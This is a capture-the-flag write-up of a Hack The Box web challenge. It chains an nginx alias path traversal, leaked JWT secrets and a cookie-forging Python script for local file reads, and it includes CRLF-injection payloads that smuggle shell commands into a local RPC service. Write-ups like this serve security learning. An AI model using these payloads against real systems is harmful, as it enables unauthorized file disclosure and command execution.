# Hackbox

Writeup by [@AteamJKR](https://www.twitter.com/AteamJKR)

## Webpage

The web page for the challenge hinted into two directions:

* nginx off-by-slash

```
So, turns out setting up nginx with Django is a little harder than I anticipated. Apparently you need to configure nginx to serve the static files used for your web application as Django doesn't really know what to do with them?

Anyway, I think it should all be working fine now, for anyone interested, this is an example of what such a configuration would look like. Hope this helps someone, peace.

     
      location /static {
          include  /etc/nginx/mime.types;
          alias /code/blog/static/;
      }
```

* hackbot RPC protocol

```
Turns out passing arguments directly to shell commands via web HTTP requests is a bad idea (who would have guessed?). Thus, i've decided to implement a little go application which runs on localhost:1337, and accepts commands over TCP connections using my own custom text based RPC protocol. Pretty ingenius if I do say so myself.

When you run a utility on the utilities page, it makes a HTTP request saying what tool to run, and the relevant parameters. The backend code then uses this to make a call to the local service over a TCP connection.

For example, a command to run the ping module would look like:

exec ping -c 2 IP_ADDRESS
```

Also there were two pages `utils` and `ipdata`.

The `utils` page had a "Subdomain Lookup" and a "Ping of Deatch" form. The first form was trying to execute `dumpster` with the given domain on the box but segfaulted. The second page executed a ping to the given IP address (but anything besides 127.0.0.1) was blocked.
The `ipdata` page also had a form to query ipinfo.io or shodan.io for "your" IP. This IP was taken from the IP packet and then written into the session cookie. As no outbound requests were allowed this did not work.

## Off-by-Slash in nginx / 

http://docker.hackthebox.eu:30724/static../settings.py

This reveals the `settings.py` of the running Flask application:

```
(...)
# SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = 'irowys6jwmjx@7tren6@#!!y)5k1k!cmgdbv&dqbh%f7v3rz$y'
JWT_SECRET = "YARE_YARE_DAZE"
(...)
```

## Using this JWT_SECRET

Using the JWT_SECRET we are able to craft abritrary session cookies. Therefore I first created a python script to read files using the ipdata function:

```
import jwt
import requests
import sys
JWT_SECRET = "YARE_YARE_DAZE"
payload = { 'data_url': 'file://' + sys.argv[1] }
jwt_cookie = jwt.encode(payload, JWT_SECRET, algorithm='HS256')
url = 'http://docker.hackthebox.eu:31203/ipdata/'
cookies = { 'ip_data_config': jwt_cookie }
r = requests.get(url, cookies=cookies)
print(r.text)
```

Using this technique I could exfil all files, i.e.:

```
python get.py /code/blog/views.py
python get.py /code/blog/urls.py
python get.py /code/blog/blogapp.py
python get.py /code/blog/blogapp
python get.py /code/blog/urls.py
python get.py /code/blogapp/views.py
python get.py /code/blogapp/helpers.py
python get.py /code/blogapp/init.py
python get.py /code/blogapp/views.py
```

The source for the blogapp utils page revealed following snippet:

```
        if util_name and argument:
            if util_name == "ping":
                cmd = f"exec {util_name} -c 4 {argument}\r\n"
            elif util_name == "dumpster":
                cmd = f"exec {util_name} {argument}\r\n"

        if cmd:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect(("127.0.0.1", 1337))
                s.sendall(bytes(cmd, 'utf-8'))
```

From the webpage we knew that the go binary on port 1337 will read from a TCP socket for `exec command-to-execute`. Unfortunately normal command injection did not work as it was not running in a shell thus no `$(...)` or backticks or even redirection was possible. But as the complete content from `argument` was being written to the TCP socket injection of CRLF was possible which I verified by touching a file and getting it again with `python.get`:

```
util_name=ping&argument=-c1+127.0.0.1%0d%0aexec+touch+/tmp/x
```

I tried to exfil the complete container but tar stopped when tar'ing `/sys`. Unfortunately the flag was not in the created tar and `--exclude` was not working from the busybox tar installed. After some fiddling I found following payload that I could use for redirection:

```
util_name=ping&argument=-c1+127.0.0.1%0d%0aexec+/bin/ash+-c+find${IFS}/>/code/blog/static/find.txt
```

This revealed the name of the flag-file `/random_string_this_is_the_flag.txt` that I could read with `python get.py ...`.
Flag is not known anymore. 

